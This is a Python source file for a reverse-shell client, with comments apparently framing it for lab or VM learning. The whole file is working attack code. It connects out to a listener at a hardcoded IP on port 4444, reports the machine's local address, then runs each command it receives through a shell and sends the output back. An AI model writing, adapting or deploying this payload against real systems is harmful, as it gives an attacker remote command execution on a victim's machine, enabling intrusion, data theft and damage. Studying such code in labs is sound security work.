
import socket
import subprocess
import os

# A simple client payload for a reverse shell.
# This script connects back to the listener and executes received commands.

def get_local_ip_address():
    """
    Attempts to get the local IP address of the machine.
    """
    try:
        # Create a socket to connect to an external server (doesn't actually connect)
        # This is a trick to get the local IP that would be used for an outbound connection.
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Google's public DNS server
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address
    except Exception:
        return "127.0.0.1" # Fallback to loopback if unable to determine

def run_client(host, port):
    """
    Connects to the listener and enters a loop to process commands.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((host, port))
        
        local_ip = get_local_ip_address()
        print(f"[+] Client's local IP: {local_ip}")
        # Send client's local IP to the listener
        client.send(f"Client connected from IP: {local_ip}\n".encode())
        
        # Main loop to receive commands and execute them
        while True:
            command = client.recv(1024).decode()
            
            if command.lower() in ["exit", "quit"]:
                break

            # Use subprocess to execute the command on the client machine
            # We split the command to handle arguments properly
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            
            # Get the output and error, if any
            stdout_value = proc.stdout.read() + proc.stderr.read()
            
            # Send the output back to the listener
            # We add a newline for better formatting on the listener's side
            client.send(stdout_value + b"\n")

    except Exception as e:
        # Silently fail in a real scenario, but we'll print for learning
        print(f"[-] Client error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    # This is the IP address of the listener (your machine).
    # IMPORTANT: For testing, this should be the private IP of the VM
    # running listener.py.
    LISTENER_HOST = "172.30.14.27" # <<< CHANGE THIS to the listener's IP
    LISTENER_PORT = 4444
    
    run_client(LISTENER_HOST, LISTENER_PORT)
